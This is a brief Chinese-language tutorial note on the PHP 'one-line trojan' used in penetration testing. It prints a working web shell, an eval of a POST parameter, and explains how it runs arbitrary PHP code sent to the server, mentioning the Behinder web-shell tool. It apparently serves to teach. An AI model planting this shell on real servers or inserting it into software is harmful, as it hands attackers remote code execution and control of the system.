## 一句话木马

在渗透测试中，测试人员往往会上传一个一句话木马到服务器上从而获取系统权限。

    <?php
    @eval($_POST['s']);
    ?>

这句话的意思： 以php代码的形式，执行 method 为 POST，键为 s 的字符串。

eval() 使后面的字符串转成php代码执行。

[$_POST]( https://www.w3school.com.cn/php/php_forms.asp ) 用于收集来自method = “post”的表单的值。

表单域的名称会自动成为 $_POST 数组中的键

$_POST[‘s’]  全局变量中 

键： key = ‘s’,  

值： value = ‘echo 22’(可以是任意形式的php代码)

也就是说，可以post任意形式的php代码到web中。

冰蝎 value 开发 形成工具。
